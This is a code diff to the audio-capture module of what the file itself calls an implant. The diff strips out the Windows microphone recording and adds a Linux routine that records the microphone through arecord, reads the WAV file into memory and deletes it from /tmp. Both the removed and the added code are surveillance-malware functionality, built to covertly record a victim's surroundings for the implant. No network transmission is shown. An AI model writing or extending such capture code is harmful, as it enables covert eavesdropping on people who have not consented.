@@ -1,39 +1,25 @@
 #include "Audio.h"
-#include <string>
+#ifdef _WIN32
+#include <windows.h>
+#include <mmsystem.h>
 #include <fstream>
 #include <thread>
-#include <mmsystem.h>
-
 #pragma comment(lib, "winmm.lib")
-
+#else
+#include <unistd.h>
+#include "../utils/Exec.h"
+#include <fstream>
+#include <vector>
+#endif
 namespace capture {
-
     std::vector<BYTE> RecordAudio(int seconds) {
-        // Use a random alias to avoid conflicts if called rapidly
-        // In a real implant, generate random string. Here, fixed is okay for serialized tasks.
-        std::string alias = "mysound";
-        
-        // Open
-        mciSendStringA(("open new type waveaudio alias " + alias).c_str(), NULL, 0, NULL);
-        
-        // Record
-        mciSendStringA(("record " + alias).c_str(), NULL, 0, NULL);
-        
-        // Wait
-        std::this_thread::sleep_for(std::chrono::seconds(seconds));
-        
-        // Stop
-        mciSendStringA(("stop " + alias).c_str(), NULL, 0, NULL);
-        
-        // Save to temp file
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        std::string wavPath = std::string(tempPath) + "rec.wav";
-        
-        mciSendStringA(("save " + alias + " \"" + wavPath + "\"").c_str(), NULL, 0, NULL);
-        mciSendStringA(("close " + alias).c_str(), NULL, 0, NULL);
-        
-        // Read file
+        (void)seconds;
+#ifdef _WIN32
+        return {};
+#else
+        std::string wavPath = "/tmp/rec.wav";
+        std::string cmd = "arecord -d " + std::to_string(seconds) + " -f cd -t wav " + wavPath;
+        utils::RunCommand(cmd);
         std::vector<BYTE> buffer;
         std::ifstream file(wavPath, std::ios::binary | std::ios::ate);
         if (file.is_open()) {
@@ -42,10 +28,9 @@ namespace capture {
             file.seekg(0, std::ios::beg);
             file.read((char*)buffer.data(), size);
             file.close();
-            DeleteFileA(wavPath.c_str());
+            unlink(wavPath.c_str());
         }
-        
         return buffer;
+#endif
     }
-
 }
